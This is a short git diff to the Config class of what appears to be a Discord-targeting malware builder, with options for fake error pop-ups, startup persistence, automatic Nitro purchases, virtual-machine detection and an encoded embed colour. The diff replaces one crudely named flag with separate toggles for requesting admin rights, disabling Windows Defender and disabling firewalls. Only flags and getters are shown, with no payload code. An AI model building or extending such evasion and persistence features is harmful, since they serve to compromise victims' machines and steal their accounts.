@@ -26,7 +26,9 @@ class Config:
         self.start_up = False
         self.fake_error = False
         self.nitro_auto_buy = False
-        self.defenderfucker = False
+        self.get_admin = False
+        self.disable_defender = False
+        self.disable_firewalls = False
         self.vmdetection = False
         
         self.secr_eb_color = 'MTY3MTE2ODA='
@@ -116,8 +118,14 @@ class Config:
     def get_nitro_auto_buy(self):
         return self.nitro_auto_buy
     
-    def get_defenderfucker(self):
-        return self.defenderfucker
+    def get_ask_admin(self):
+        return self.get_admin
+    
+    def get_disable_windows_defender(self):
+        return self.disable_defender
+    
+    def get_disable_windows_firewalls(self):
+        return self.disable_firewalls
 
     def get_vmdetection(self):
         return self.vmdetection
